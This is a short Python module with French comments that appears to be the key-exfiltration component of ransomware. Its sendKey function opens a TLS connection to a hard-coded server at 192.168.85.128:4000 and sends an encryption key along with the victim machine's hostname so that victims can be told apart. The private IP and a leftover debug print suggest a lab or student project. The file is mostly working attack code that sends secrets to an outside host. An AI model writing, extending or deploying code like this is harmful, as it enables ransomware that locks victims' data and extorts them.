# import :
import socket, ssl, platform

# Variables
HOST, PORT = '192.168.85.128', 4000
nom_ordi = platform.node()


def sendKey(key):
    """ Envoie la clés chiffrée sur un serveur distant
    :param key -- clé de chiffrement:
    """
    # Création du socket et configuration SSL
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    context.options |= ssl.PROTOCOL_TLSv1_2

    # Création du socket SSL
    sslSocket = ssl.wrap_socket(sock)

    # Connection au serveur distant
    sslSocket.connect((HOST, PORT))

    # Commande de débugging à retirer plus tard
    print(sslSocket.cipher())

    # Envoie de la clé et du nom de l'ordinateur pour différencier
    sslSocket.send(key)
    sslSocket.send(nom_ordi.encode())

    # Ferme la connection au serveur
    sslSocket.close()
    sock.close()
